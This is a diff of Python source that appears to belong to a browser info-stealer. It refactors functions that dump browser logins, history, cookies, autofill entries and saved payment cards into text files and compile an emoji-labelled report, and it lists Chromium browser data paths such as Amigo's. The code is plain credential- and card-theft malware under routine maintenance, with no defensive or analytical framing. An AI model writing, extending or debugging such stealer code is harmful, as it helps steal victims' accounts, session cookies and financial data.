@@ -295,27 +295,27 @@ def Write(pathToLogs, browser):
         msgInfo+="\n∟🔑logins"
     
     if (history):
-        with open(rf"{pathToLogs}\\{browser}\\history.txt", "w", encoding="utf-8") as f:
+        with open(join(pathToLogs, browser, "history.txt"), "w", encoding="utf-8") as f:
             f.write(history)
         msgInfo+="\n∟📰history"
     
     if (downhistory):
-        with open(rf"{pathToLogs}\\{browser}\\downhistory.txt", "w", encoding="utf-8") as f:
+        with open(join(pathToLogs, browser, "downhistory.txt"), "w", encoding="utf-8") as f:
             f.write(downhistory)
         msgInfo+="\n∟📥downhistory"
     
     if (cookies):
-        with open(rf"{pathToLogs}\\{browser}\\cookies.txt", "w", encoding="utf-8") as f:
+        with open(join(pathToLogs, browser, "cookies.txt"), "w", encoding="utf-8") as f:
             f.write(cookies)
         msgInfo+="\n∟🍪cookies"
     
     if (autofills):
-        with open(rf"{pathToLogs}\\{browser}\\autofills.txt", "w", encoding="utf-8") as f:
+        with open(join(pathToLogs, browser, "autofills.txt"), "w", encoding="utf-8") as f:
             f.write(autofills)
         msgInfo+="\n∟⌨autofills"
     
     if (cards):
-        with open(rf"{pathToLogs}\\{browser}\\cards.txt", "w", encoding="utf-8") as f:
+        with open(join(pathToLogs, browser, "cards.txt"), "w", encoding="utf-8") as f:
             f.write(cards)
         msgInfo+="\n∟💳cards"
         
@@ -341,10 +341,9 @@ def Chromium():
     Log("===========Chromium===========")
     msgInfo+="\n<b>🌐Browsers🌐</b>"
 
-    user = environ["USERPROFILE"]
     local = environ["LOCALAPPDATA"]
     roaming = environ["APPDATA"]
-    pathToLogs = join(user, config.pathToLogs, "Browsers")
+    pathToLogs = join(config.pathToLogs, "Browsers")
 
     browsers = {
         'Amigo': local + '\\Amigo\\User Data',
